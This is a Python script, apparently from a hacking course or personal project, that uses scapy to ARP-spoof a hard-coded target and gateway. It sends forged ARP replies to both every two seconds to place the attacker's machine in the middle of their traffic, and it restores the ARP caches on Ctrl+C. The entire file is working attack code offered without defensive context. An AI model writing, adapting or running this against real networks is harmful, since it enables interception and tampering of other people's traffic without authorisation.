import scapy.all as scapy 
import time

def get_mac(ip):
    arp_request = scapy.ARP(pdst=ip)
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_request_broadcast = broadcast / arp_request
    answered_list = scapy.srp(arp_request_broadcast, timeout=1, verbose=False)[0]

    return answered_list[0][1].hwsrc

def spoof(target_ip, spoof_ip):
    target_mac = get_mac(target_ip)
    if not target_mac:
        print(f"[-] Failed to get MAC for {target_ip}. Exiting...")
        return
    arp_response = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
    ether = scapy.Ether(dst=target_mac)
    packet = ether /arp_response
    scapy.send(packet, verbose=False)

def restore(destination_ip, source_ip):
    destination_mac = get_mac(destination_ip)
    source_mac = get_mac(source_ip)
    packet = scapy.ARP(op=2, pdst=destination_ip, hwdst=destination_mac, psrc=source_ip, hwsrc=source_mac)
#    print(packet.show())
#    print(packet.summary())
    scapy.send(packet, count=4, verbose=False)

target_ip = "192.168.25.224"
gateway_ip = "192.168.25.13"

sent_packets_count = 0
try:
    while True:
        spoof("192.168.25.224", "192.168.25.13")
        spoof("192.168.25.13", "192.168.25.224")
        sent_packets_count +=2
        print("\r[+] Packets sent: " + str(sent_packets_count), end="")
        time.sleep(2) 
except KeyboardInterrupt:
    print("\n[-] Detected CTRL + C ... Quitting.")
    restore("192.168.25.224", "192.168.25.13")
    restore("192.168.25.13", "192.168.25.224")